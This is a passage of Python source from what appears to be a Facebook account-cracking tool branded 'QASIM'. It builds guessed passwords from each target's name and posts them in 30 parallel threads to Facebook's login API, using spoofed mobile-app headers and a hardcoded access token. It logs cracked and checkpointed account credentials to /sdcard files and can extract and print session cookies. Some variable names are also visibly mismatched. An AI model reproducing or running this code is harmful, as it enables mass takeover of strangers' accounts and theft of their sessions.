                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;92mCookie\033[1;93m] \033[1;92m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;92m[\033[1;92mQASIM -CP\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword)
                cpacc.append(acc)
                open('/sdcard/QASIM -CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=30) as speede:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()  
      



####@-----Random-----@####
def andom():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o': 
        tpp = input(f'{oo("?")}Total Password? : ')
        totalpass.append('first')
        totalpass.append('last')
        if tpp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(tpp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/QASIM -OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;92m[\033[1;92mQAS-M1\033[1;92m]\033[1;92m {}-{} \033[1;92m[\033[1;92m{}\033[1;92m] \033[1;92mOK : \033[1;92m{} \033[1;95mCP : \033[1;92m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf92a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mQASIM -OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+' ')
                open('/sdcard/QASIM -OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;92m[\033[1;95mQASIM -CP\033[1;92m] \033[1;95m'+acc+' \033[1;95m•\033[1;95m '+pword+' ')
                cpacc.append(acc)
                open('/sdcard/QASIM -CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   



 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;92m[\033[1;92mQAS-M2\033[1;92m]\033[1;92m {}-{} \033[1;92m[\033[1;92m{}\033[1;92m] \033[1;92mOK : \033[1;92m{} \033[1;92mCP : \033[1;92m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf92a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mQASIM -OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+' ')
                open('/sdcard/QASIM -OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;92mCookie\033[1;93m] \033[1;92m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;92m[\033[1;95mQASIM -CP\033[1;92m] \033[1;95m'+acc+' \033[1;92m•\033[1;95m '+pword)
                cpacc.append(acc)
                open('/sdcard/QASIM -CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

      
    for x in open('.rndm','r').read().splitlines():
    	accounts.append(x)
    
    if m=='2':
        with speed(max_workers=30) as speeed:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()




QAS_Main()
